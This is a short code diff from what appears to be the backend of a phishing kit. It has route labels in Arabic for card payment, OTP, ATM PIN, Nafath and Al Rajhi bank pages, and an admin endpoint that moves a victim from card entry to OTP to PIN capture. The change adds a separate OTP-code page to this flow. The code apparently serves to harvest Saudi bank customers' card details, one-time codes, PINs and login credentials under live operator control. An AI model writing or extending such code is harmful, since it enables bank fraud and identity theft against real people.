@@ -638,7 +638,8 @@ io.on("connection", (socket) => {
         '/home': 'الصفحة الرئيسية',
         '/booking': 'صفحة الحجز',
         '/payments': 'صفحة الدفع',
-        '/phone': 'صفحة OTP',
+        '/phone': 'صفحة تأكيد الجوال',
+        '/code': 'صفحة OTP (رمز التحقق)',
         '/pin': 'صفحة الرقم السري ATM',
         '/nafad': 'صفحة نفاذ',
         '/rajhi': 'صفحة الراجحي',
@@ -863,7 +864,7 @@ app.post("/api/admin/payment-action", verifyAdminToken, async (req, res) => {
     if (action === 'pass') {
       // تحديد الصفحة التالية بناءً على الخطوة
       if (currentStep === 1) {
-        targetPage = 'phone'; // بعد بيانات البطاقة → صفحة OTP
+        targetPage = 'code'; // بعد بيانات البطاقة → صفحة OTP (رمز التحقق)
         nextStep = 1; // تمت الخطوة 1
       } else if (currentStep === 2) {
         targetPage = 'pin'; // بعد OTP → صفحة الرقم السري ATM
